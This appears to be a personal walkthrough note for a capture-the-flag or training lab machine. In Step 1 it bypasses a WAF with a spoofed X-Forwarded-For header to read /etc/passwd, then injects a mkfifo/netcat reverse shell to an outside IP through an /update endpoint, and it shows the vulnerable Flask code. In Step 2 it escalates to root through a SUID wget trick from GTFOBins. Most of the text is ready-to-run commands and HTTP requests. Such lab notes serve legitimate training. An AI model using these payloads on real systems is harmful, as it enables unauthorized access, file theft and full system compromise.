#box

*Created: 1/14/2026*

### Step 1

**Tags:** #WAF #X-Forwarded-For #Arbitrary-File-Read #Reverse-Shell

🔗 **URL/Link:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For

**Command:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.198 13337 >/tmp/f
```

*Port: 13337 | 💎 GEM*

> 
> The machine exposes on port 13337 a website on which a few APIs are listed. Leveraging on `/logs` through the X-Forwarded-For header permits us to bypass the WAF and gain Arbitrary File Read vulnerability on the target machine
> 
> The trouble in her lies in the fact that we didn't know that we could bypass the WAF by adding a `X-Forwarded-For` Header with a value of `127.0.0.1`. 
> As mentioned on [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For#:~:text=Using%20untrustworthy%20values%20can%20result%20in%20rate%2Dlimiter%20avoidance%2C%20access%2Dcontrol%20bypass%2C%20memory%20exhaustion%2C%20or%20other%20negative%20security%20or%20availability%20consequences.) this particular header can lead to access-control bypass, which is exactly our case.
> 
> We can model the request to look like this and obtain Arbitrary File Read on the target machine:
> 
```request
GET /logs?file=/etc/passwd HTTP/1.1
Host: 192.168.206.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-Forwarded-For: 127.0.0.1
```
> NOTE: The request must have two empty lines at the end otherwise it doesn't work.
> 
> Modeling this request will permit us to access to the `/etc/passwd` file and reveal the user we can then specify on the `/update` endpoint, which is `clumsyadmin`
> 
> 
> Once obtained the user, we can switch to the `/update` API where sending the following reverse shell will grant us a shell:
> 
```request
POST /update HTTP/1.1
Host: 192.168.206.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 114

{"user":"clumsyadmin", "url":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.198 13337 >/tmp/f"}
```
> 
> The following python code in `main.py` once obtained a shell demonstrates how the `X-Forwarded-For` could bypass the WAF:
> 
```python
@app.route('/logs')
def readlogs():
  if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
  else:
        ip = "1.3.3.7"
  if ip == "localhost" or ip == "127.0.0.1":
    if request.args.get("file") == None:
        return("Error! No file specified. Use file=/path/to/log/file to access log files.", 404)
    else:
        data = ''
        with open(request.args.get("file"), 'r') as f:
            data = f.read()
            f.close()
        return(render_template("logs.html", data=data))
  else:
       return("WAF: Access Denied for this Host.",403
```

---

### Step 2

**Tags:** #wget #SUID #GTFOBins

**Command:**
```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
```

> 
> On the target machine, a `wget` SUID grants us a root shell through the following [GTFOBins](https://gtfobins.github.io/gtfobins/wget/#suid)

---

